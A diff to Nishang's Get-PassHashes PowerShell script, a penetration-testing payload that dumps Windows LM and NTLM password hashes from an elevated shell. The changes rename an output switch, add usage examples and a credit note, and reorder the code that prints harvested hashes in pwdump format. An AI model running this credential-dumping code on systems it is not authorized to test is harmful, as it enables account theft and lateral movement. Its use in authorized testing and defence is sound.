@@ -5,19 +5,28 @@ Nishang payload which dumps password hashes.
  
 .DESCRIPTION 
 The payload dumps password hashes using the modified powerdump script from MSF. Administrator privileges are required for this script
-(but not SYSTEM privs as for the original powerdump)
+(but not SYSTEM privs as for the original powerdump written by David Kennedy)
 
 .EXAMPLE 
 PS > Get-PassHashes
+Run above from an elevated shell.
+
+
+.EXAMPLE 
+PS > Get-PassHashes -PSObjectFormat
+Use above to receive the hashes output as a PSObject.
  
 .LINK 
 http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
 https://github.com/samratashok/nishang
 
+.Notes
+Reflection added by https://github.com/Zer1t0
+
 #> 
 [CmdletBinding()]
 Param (
-    [Switch]$StringFormat
+    [Switch]$PSObjectFormat
 )
 
 $script:PowerDump = $null
@@ -387,17 +396,20 @@ function DumpHashes
     $hbootKey = Get-HBootKey $bootkey;
     Get-UserKeys | %{
         $hashes = Get-UserHashes $_ $hBootKey;
-        if($StringFormat){
-        "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
-            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
-            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
-        }else{
+        if($PSObjectFormat)
+        {
             $creds = New-Object psobject
             $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
             $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
             $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
             $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
             $creds
+        }
+        else
+        {
+            "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
+            [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
+            [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
         }
     }
 }
